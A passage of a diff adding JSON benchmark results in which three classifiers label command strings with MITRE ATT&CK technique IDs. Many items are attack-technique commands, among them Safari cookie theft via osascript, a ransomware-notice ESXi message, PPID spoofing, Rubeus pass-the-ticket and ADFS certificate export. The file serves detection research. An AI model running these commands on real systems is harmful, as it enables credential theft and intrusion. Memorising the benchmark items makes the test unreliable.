+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1003",
+        "T1059",
+        "T1555"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1003",
+        "T1059",
+        "T1082"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 33,
+      "gt": "T1204",
+      "command": "$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"",
+      "tfidf_top3": [
+        "T1204",
+        "T1562",
+        "T1498"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1204",
+        "T1562",
+        "T1498"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1059",
+        "T1027",
+        "T1564"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 34,
+      "gt": "T1053",
+      "command": "SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR \"[path to self]\" /ST 10:00",
+      "tfidf_top3": [
+        "T1053",
+        "T1036",
+        "T1678"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1053",
+        "T1036",
+        "T1678"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1053",
+        "T1547",
+        "T1059"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 35,
+      "gt": "T1491",
+      "command": "echo \"\" | \"$plink_file\" -batch \"$vm_host\" -ssh -l $vm_user -pw \"$vm_pass\" \"esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'\"",
+      "tfidf_top3": [
+        "T1562",
+        "T1087",
+        "T1082"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1562",
+        "T1087",
+        "T1082"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1059",
+        "T1021",
+        "T1565"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 36,
+      "gt": "T1055",
+      "command": ".text",
+      "tfidf_top3": [
+        "T1497",
+        "T1105",
+        "T1036"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1497",
+        "T1105",
+        "T1036"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1059",
+        "T1027",
+        "T1140"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 37,
+      "gt": "T1012",
+      "command": "Windows\\CurrentVersion\\Uninstall",
+      "tfidf_top3": [
+        "T1547",
+        "T1012",
+        "T1059"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1547",
+        "T1012",
+        "T1059"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1012",
+        "T1112",
+        "T1083"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 38,
+      "gt": "T1134",
+      "command": "PPID-Spoof -ppid $ppid -spawnto \"$spawnto_process_path\" -dllpath \"$dll_path\"",
+      "tfidf_top3": [
+        "T1505",
+        "T1546",
+        "T1218"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1505",
+        "T1546",
+        "T1218"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1134",
+        "T1055",
+        "T1218"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 39,
+      "gt": "T1546",
+      "command": "\"import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))\" | Out-File -Encoding ASCII \"$SitePackages\\atomic_hook.pth\"",
+      "tfidf_top3": [
+        "T1546",
+        "T1562",
+        "T1059"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1546",
+        "T1562",
+        "T1059"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1546",
+        "T1059",
+        "T1106"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 40,
+      "gt": "T1556",
+      "command": "userParameters",
+      "tfidf_top3": [
+        "T1087",
+        "T1059",
+        "T1106"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1087",
+        "T1059",
+        "T1106"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1562",
+        "T1112",
+        "T1059"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 41,
+      "gt": "T1018",
+      "command": "net group \"Domain Controllers\" /domain",
+      "tfidf_top3": [
+        "T1018",
+        "T1069",
+        "T1087"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1018",
+        "T1069",
+        "T1087"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1069",
+        "T1087",
+        "T1018"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 42,
+      "gt": "T1486",
+      "command": "echo \"Hi friends\" >> $env:Userprofile\\Desktop\\akira_readme.txt",
+      "tfidf_top3": [
+        "T1486",
+        "T1562",
+        "T1564"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1486",
+        "T1562",
+        "T1564"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1059",
+        "T1036",
+        "T1565"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 43,
+      "gt": "T1083",
+      "command": "ls -a >> $output_file",
+      "tfidf_top3": [
+        "T1083",
+        "T1059",
+        "T1135"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1083",
+        "T1059",
+        "T1135"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1083",
+        "T1059",
+        "T1005"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 44,
+      "gt": "T1078",
+      "command": "New-AzAutomationRunbook -Name $runbook_name -Type PowerShell -ResourceGroupName $resource_group -Description 'my-test-runbook' -AutomationAccountName $automation_account_name",
+      "tfidf_top3": [
+        "T1069",
+        "T1562",
+        "T1619"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1069",
+        "T1562",
+        "T1619"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1059",
+        "T1651",
+        "T1078"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 45,
+      "gt": "T1539",
+      "command": "osascript -e 'tell application \"Finder\"' -e 'set destinationFolderPath to POSIX file \"$destination_path\"' -e 'set safariFolder to ((path to library folder from user domain as text) & \"Containers:com.apple.Safari:Data:Library:Cookies:\")' -e 'duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'",
+      "tfidf_top3": [
+        "T1539",
+        "T1555",
+        "T1562"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1539",
+        "T1555",
+        "T1562"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1005",
+        "T1555",
+        "T1059"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 46,
+      "gt": "T1485",
+      "command": "PutLifecycleConfiguration",
+      "tfidf_top3": [
+        "T1106",
+        "T1082",
+        "T1110"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1106",
+        "T1082",
+        "T1110"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1098",
+        "T1565",
+        "T1484"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 47,
+      "gt": "T1114",
+      "command": "New-MailboxExportRequest",
+      "tfidf_top3": [
+        "T1114",
+        "T1036",
+        "T1106"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1114",
+        "T1036",
+        "T1106"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1114",
+        "T1119",
+        "T1025"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 48,
+      "gt": "T1614",
+      "command": "GetKeyboardType",
+      "tfidf_top3": [
+        "T1056",
+        "T1106",
+        "T1036"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1056",
+        "T1106",
+        "T1036"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1120",
+        "T1010",
+        "T1082"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 49,
+      "gt": "T1528",
+      "command": "Write-Output \"Function code upload failed.\"",
+      "tfidf_top3": [
+        "T1528",
+        "T1619",
+        "T1218"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1528",
+        "T1619",
+        "T1218"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1059",
+        "T1027",
+        "T1140"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 50,
+      "gt": "T1041",
+      "command": "Resolve-DnsName -Name $dnsQuery",
+      "tfidf_top3": [
+        "T1562",
+        "T1548",
+        "T1071"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1562",
+        "T1548",
+        "T1071"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1016",
+        "T1046",
+        "T1059"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 51,
+      "gt": "T1098",
+      "command": "Set-AzureADUserPassword -ObjectId $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue",
+      "tfidf_top3": [
+        "T1098",
+        "T1552",
+        "T1110"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1098",
+        "T1552",
+        "T1110"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1098",
+        "T1110",
+        "T1078"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 52,
+      "gt": "T1564",
+      "command": "/etc/rc.local.d/local.sh",
+      "tfidf_top3": [
+        "T1037",
+        "T1543",
+        "T1027"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1037",
+        "T1543",
+        "T1027"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1037",
+        "T1059",
+        "T1547"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 53,
+      "gt": "T1001",
+      "command": "$base64Strings | Set-Content \"$HOME\\decoded.ps1\"",
+      "tfidf_top3": [
+        "T1140",
+        "T1027",
+        "T1526"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1140",
+        "T1027",
+        "T1526"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1059",
+        "T1140",
+        "T1105"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 54,
+      "gt": "T1217",
+      "command": "dir /s /b %USERPROFILE%\\Favorites",
+      "tfidf_top3": [
+        "T1083",
+        "T1552",
+        "T1562"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1083",
+        "T1552",
+        "T1562"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1083",
+        "T1005",
+        "T1082"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 55,
+      "gt": "T1137",
+      "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\" /v Level /t REG_DWORD /d 1 /f",
+      "tfidf_top3": [
+        "T1112",
+        "T1546",
+        "T1547"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1112",
+        "T1546",
+        "T1547"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1112",
+        "T1119",
+        "T1562"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 56,
+      "gt": "T1074",
+      "command": "a9850d2f",
+      "tfidf_top3": [
+        "T1564",
+        "T1059",
+        "T1036"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1564",
+        "T1059",
+        "T1036"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1027",
+        "T1140",
+        "T1036"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 57,
+      "gt": "T1082",
+      "command": "cat /etc/*release | uniq",
+      "tfidf_top3": [
+        "T1059",
+        "T1562",
+        "T1036"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1059",
+        "T1562",
+        "T1036"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1082",
+        "T1005",
+        "T1033"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 58,
+      "gt": "T1136",
+      "command": "echo \"$password\" | pw usermod $username -h 0",
+      "tfidf_top3": [
+        "T1110",
+        "T1136",
+        "T1078"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1110",
+        "T1136",
+        "T1078"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1098",
+        "T1059",
+        "T1078"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 59,
+      "gt": "T1056",
+      "command": "write-warning $cred.GetNetworkCredential().Password",
+      "tfidf_top3": [
+        "T1098",
+        "T1136",
+        "T1552"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1098",
+        "T1136",
+        "T1552"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1555",
+        "T1059",
+        "T1003"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 60,
+      "gt": "T1529",
+      "command": "SeShutdownPrivilege",
+      "tfidf_top3": [
+        "T1529",
+        "T1489",
+        "T1546"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1529",
+        "T1489",
+        "T1546"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1548",
+        "T1134",
+        "T1068"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 61,
+      "gt": "T1046",
+      "command": "spoolvulnscan -noninteractive -consoleoutput",
+      "tfidf_top3": [
+        "T1552",
+        "T1555",
+        "T1082"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1552",
+        "T1555",
+        "T1082"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1046",
+        "T1595",
+        "T1082"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 62,
+      "gt": "T1201",
+      "command": "Get-PassPol",
+      "tfidf_top3": [
+        "T1106",
+        "T1552",
+        "T1069"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1106",
+        "T1552",
+        "T1069"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1069",
+        "T1087",
+        "T1059"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 63,
+      "gt": "T1037",
+      "command": "sudo chmod +x /etc/rc.local",
+      "tfidf_top3": [
+        "T1037",
+        "T1548",
+        "T1014"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1037",
+        "T1548",
+        "T1014"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1547",
+        "T1222",
+        "T1036"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 64,
+      "gt": "T1021",
+      "command": "vim-cmd hostsvc/enable_ssh",
+      "tfidf_top3": [
+        "T1562",
+        "T1564",
+        "T1059"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1562",
+        "T1564",
+        "T1059"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1021",
+        "T1059",
+        "T1562"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 65,
+      "gt": "T1559",
+      "command": "NSXPCConnection API",
+      "tfidf_top3": [
+        "T1106",
+        "T1049",
+        "T1564"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1106",
+        "T1049",
+        "T1564"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1559",
+        "T1106",
+        "T1027"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 66,
+      "gt": "T1135",
+      "command": "smbutil view -g //$computer_name",
+      "tfidf_top3": [
+        "T1135",
+        "T1562",
+        "T1087"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1135",
+        "T1562",
+        "T1087"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1021",
+        "T1135",
+        "T1018"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 67,
+      "gt": "T1057",
+      "command": "CreateToolhelp32Snapshot",
+      "tfidf_top3": [
+        "T1106",
+        "T1057",
+        "T1036"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1106",
+        "T1057",
+        "T1036"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1057",
+        "T1106",
+        "T1082"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 68,
+      "gt": "T1007",
+      "command": "FAX",
+      "tfidf_top3": [
+        "T1059",
+        "T1105",
+        "T1005"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1059",
+        "T1105",
+        "T1005"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1204",
+        "T1566",
+        "T1059"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 69,
+      "gt": "T1553",
+      "command": "g_CiOptions",
+      "tfidf_top3": [
+        "T1059",
+        "T1529",
+        "T1070"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1059",
+        "T1529",
+        "T1070"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1014",
+        "T1562",
+        "T1112"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 70,
+      "gt": "T1619",
+      "command": "QueueName = \"\"",
+      "tfidf_top3": [
+        "T1619",
+        "T1567",
+        "T1059"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1619",
+        "T1567",
+        "T1059"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1070",
+        "T1562",
+        "T1027"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 71,
+      "gt": "T1202",
+      "command": "procdump.exe -md {PATH:.dll} foobar",
+      "tfidf_top3": [
+        "T1202",
+        "T1218",
+        "T1127"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1202",
+        "T1218",
+        "T1127"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1003",
+        "T1055",
+        "T1574"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 72,
+      "gt": "T1047",
+      "command": "wmic process call create $process_to_execute",
+      "tfidf_top3": [
+        "T1047",
+        "T1057",
+        "T1082"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1047",
+        "T1057",
+        "T1082"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1047",
+        "T1059",
+        "T1106"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 73,
+      "gt": "T1518",
+      "command": "Get-NetFirewallSetting",
+      "tfidf_top3": [
+        "T1518",
+        "T1016",
+        "T1562"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1518",
+        "T1016",
+        "T1562"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1016",
+        "T1049",
+        "T1082"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 74,
+      "gt": "T1622",
+      "command": "CheckRemoteDebuggerPresent",
+      "tfidf_top3": [
+        "T1622",
+        "T1564",
+        "T1547"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1622",
+        "T1564",
+        "T1547"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1622",
+        "T1055",
+        "T1497"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 75,
+      "gt": "T1113",
+      "command": "screencapture -x $output_file",
+      "tfidf_top3": [
+        "T1113",
+        "T1125",
+        "T1040"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1113",
+        "T1125",
+        "T1040"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1113",
+        "T1059",
+        "T1005"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 76,
+      "gt": "T1216",
+      "command": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}",
+      "tfidf_top3": [
+        "T1216",
+        "T1218",
+        "T1127"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1216",
+        "T1218",
+        "T1127"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1059",
+        "T1059",
+        "T1127"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 77,
+      "gt": "T1567",
+      "command": "$env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"",
+      "tfidf_top3": [
+        "T1567",
+        "T1098",
+        "T1555"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1567",
+        "T1098",
+        "T1555"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1552",
+        "T1078",
+        "T1059"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 78,
+      "gt": "T1550",
+      "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asktgs /service:cifs/$target /ticket:ticket.kirbi /ptt",
+      "tfidf_top3": [
+        "T1550",
+        "T1558",
+        "T1543"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1550",
+        "T1558",
+        "T1543"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1558",
+        "T1550",
+        "T1078"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 79,
+      "gt": "T1048",
+      "command": "else",
+      "tfidf_top3": [
+        "T1137",
+        "T1016",
+        "T1546"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1548",
+        "T1106",
+        "T1574"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1059",
+        "T1027",
+        "T1204"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 80,
+      "gt": "T1090",
+      "command": "networksetup -setsecurewebproxy $interface $proxy_server $proxy_port",
+      "tfidf_top3": [
+        "T1090",
+        "T1016",
+        "T1562"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1090",
+        "T1016",
+        "T1562"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1090",
+        "T1562",
+        "T1112"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 81,
+      "gt": "T1680",
+      "command": "IOCTL_DISK_GET_DRIVE_GEOMETRY",
+      "tfidf_top3": [
+        "T1680",
+        "T1082",
+        "T1574"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1680",
+        "T1082",
+        "T1574"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1120",
+        "T1082",
+        "T1005"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 82,
+      "gt": "T1119",
+      "command": "wmic process list > %TEMP%\\T1119_3.txt",
+      "tfidf_top3": [
+        "T1119",
+        "T1057",
+        "T1518"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1119",
+        "T1057",
+        "T1518"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1047",
+        "T1005",
+        "T1074"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 83,
+      "gt": "T1049",
+      "command": "GetExtendedTcpTable",
+      "tfidf_top3": [
+        "T1049",
+        "T1046",
+        "T1106"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1049",
+        "T1046",
+        "T1106"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1049",
+        "T1016",
+        "T1082"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 84,
+      "gt": "T1482",
+      "command": "\"$trufflesnout_path\" forest -n $domain",
+      "tfidf_top3": [
+        "T1482",
+        "T1071",
+        "T1110"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1482",
+        "T1071",
+        "T1110"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1087",
+        "T1018",
+        "T1069"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 85,
+      "gt": "T1552",
+      "command": "Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key",
+      "tfidf_top3": [
+        "T1552",
+        "T1562",
+        "T1021"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
